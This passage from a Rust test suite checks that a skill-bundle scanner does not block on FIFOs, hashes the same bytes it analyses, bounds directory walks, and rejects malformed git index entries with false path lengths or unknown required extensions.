        // ends at 93 and the entry is padded to 100, so byte 99 is padding.
        bad_padding[99] = b'X';
        let checksum = sha1_digest(&bad_padding[..bad_padding.len() - 20]);
        let len = bad_padding.len();
        bad_padding[len - 20..].copy_from_slice(&checksum);
        fs::write(&index_file, &bad_padding).unwrap();
        assert_eq!(both_surfaces(&skill), (false, false), "bad padding");

        fs::remove_dir_all(&root).unwrap();
    }

    // ── second-round review: snapshot, bounds, index flags (#315/#1216) ──

    #[cfg(unix)]
    #[test]
    fn fifo_replacement_never_blocks_a_read() {
        // Why this matters: `File::open` ran *before* the descriptor type check,
        // so a regular file swapped for a FIFO blocked the scan until a writer
        // appeared — the guard was never reached.
        let root = fixture_root("fifo-open");
        let fifo = root.join("SKILL.md");
        if !make_fifo(&fifo) {
            eprintln!("SKIPPED fifo_replacement_never_blocks_a_read: mkfifo unavailable");
            return;
        }
        let path = fifo.clone();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let text_refused = matches!(read_text_file(&path, 1024), TextRead::Unreadable);
            let hash_refused = matches!(hash_bundle_file(&path), HashOutcome::Unreadable);
            let _ = tx.send((text_refused, hash_refused));
        });
        let outcome = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("opening a FIFO must never block");
        assert_eq!(outcome, (true, true), "a FIFO is never readable text");
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn bundle_digest_covers_the_bytes_that_were_analyzed() {
        // Why this matters: text was read for the scan, then the bundle walk
        // reopened and hashed every file. A change in between paired the old
        // analyzed text with a digest of the new bytes, so "one snapshot" was
        // not true even without cache reuse.
        let root = fixture_root("phase-change");
        fs::write(root.join("SKILL.md"), "# old\n").unwrap();
        let hook_root = root.clone();
        let load = load_skill_files_with(&root, WALK_SAFETY_LIMIT, &move || {
            fs::write(hook_root.join("SKILL.md"), "# new\n").unwrap();
        });
        assert_eq!(
            load.text_files.get("SKILL.md").map(String::as_str),
            Some("# old\n")
        );
        let expected = format!(
            "{:x}",
            Sha256::digest(
                serde_json::to_string(&vec![(
                    "SKILL.md".to_string(),
                    "file",
                    format!("{:x}", Sha256::digest(b"# old\n")),
                )])
                .unwrap()
                .as_bytes()
            )
        );
        assert_eq!(
            load.bundle_digest.as_deref(),
            Some(expected.as_str()),
            "the digest must describe the analyzed bytes, not a later read"
        );
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn directory_enumeration_stops_at_the_budget() {
        // Why this matters: `read_dir.flatten().collect()` materialised a whole
        // directory before the budget was consulted, so a hostile flat tree
        // could exhaust memory without ever reaching the cap.
        let root = fixture_root("bounded-readdir");
        for i in 0..40 {
            fs::write(root.join(format!("f{i:02}.md")), "x").unwrap();
        }
        let mut budget = WalkBudget::new(10);
        let entries = read_dir_bounded(fs::read_dir(&root).unwrap(), &mut budget);
        assert_eq!(entries.len(), 10);
        assert!(budget.capped);
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn deep_tree_is_incomplete_instead_of_recursing() {
        // Why this matters: recursion had no depth guard, so a pathologically
        // deep tree was walked to the end (and could exhaust the stack) while
        // the analysis still reported complete.
        let root = fixture_root("deep-tree");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        let mut dir = root.clone();
        for _ in 0..(MAX_WALK_DEPTH + 4) {
            dir.push("d");
            fs::create_dir(&dir).unwrap();
        }
        let load = load_skill_files(&root);
        assert!(load.partial, "a depth-bound walk must be partial");
        assert!(
            load.incomplete_reasons.contains(&"file-cap"),
            "{:?}",
            load.incomplete_reasons
        );
        fs::remove_dir_all(&root).unwrap();
    }

    /// Rewrite the 16-bit flags of one entry and re-seal the checksum, so the
    /// only thing wrong with the index is what the test wants it to be.
    #[cfg(test)]
    fn patch_index_flags(git_dir: &Path, target: &str, flags: u16) {
        let index = git_dir.join("index");
        let mut data = fs::read(&index).unwrap();
        let body_end = data.len() - 20;
        let at = data[..body_end]
            .windows(target.len())
            .position(|window| window == target.as_bytes())
            .expect("fixture index must contain the path");
        let flags_at = at - 2;
        data[flags_at..flags_at + 2].copy_from_slice(&flags.to_be_bytes());
        let checksum = sha1_digest(&data[..body_end]);
        let len = data.len();
        data[len - 20..].copy_from_slice(&checksum);
        fs::write(&index, data).unwrap();
    }

    /// Append one extension header and re-seal the checksum.
    #[cfg(test)]
    fn append_index_extension(git_dir: &Path, signature: &[u8; 4], body: &[u8]) {
        let index = git_dir.join("index");
        let mut data = fs::read(&index).unwrap();
        let body_end = data.len() - 20;
        data.truncate(body_end);
        data.extend_from_slice(signature);
        data.extend_from_slice(&(body.len() as u32).to_be_bytes());
        data.extend_from_slice(body);
        let checksum = sha1_digest(&data);
        let len = data.len();
        data.extend_from_slice(&checksum);
        assert_eq!(data.len(), len + 20);
        fs::write(&index, data).unwrap();
    }

    #[test]
    fn checksum_valid_index_with_a_lying_path_length_is_rejected() {
        // Why this matters: the reader parsed the flags but never compared the
        // declared pathname length to the NUL-terminated name, so an index that
        // real git rejects (checksum valid, length wrong) still granted
        // provenance to a bundle.
        let root = fixture_repo("index-flags");
        fs::create_dir_all(root.join("skills/own")).unwrap();
        let skill = root.join("skills/own/SKILL.md");
        fs::write(&skill, "# own\n").unwrap();
        let git_dir = root.join(".git");
        write_test_index(&git_dir, &["skills/own/SKILL.md"]);
        assert_eq!(both_surfaces(&skill), (true, true));

        // The name is 19 bytes long; the flags claim 1.
        patch_index_flags(&git_dir, "skills/own/SKILL.md", 1);
        assert_eq!(
            both_surfaces(&skill),
            (false, false),
            "declared name length disagrees with the name"
        );

        // A required extension this reader does not understand.
        write_test_index(&git_dir, &["skills/own/SKILL.md"]);
        assert_eq!(both_surfaces(&skill), (true, true));
        append_index_extension(&git_dir, b"abcd", b"payload");
        assert_eq!(
            both_surfaces(&skill),
            (false, false),
            "an unknown required extension must fail closed"
        );

        // An optional extension may be skipped.
        write_test_index(&git_dir, &["skills/own/SKILL.md"]);
        append_index_extension(&git_dir, b"Abcd", b"payload");
        assert_eq!(
            both_surfaces(&skill),
            (true, true),
            "an unknown optional extension is skippable"
        );

        // `0xfff` is a lower bound, so a 19-byte name declared as 0xfff is
        // malformed too.
        write_test_index(&git_dir, &["skills/own/SKILL.md"]);
        patch_index_flags(&git_dir, "skills/own/SKILL.md", 0x0fff);
        assert_eq!(
            both_surfaces(&skill),
            (false, false),
            "0xfff claims a name at least that long"
        );
        fs::remove_dir_all(&root).unwrap();
    }
}
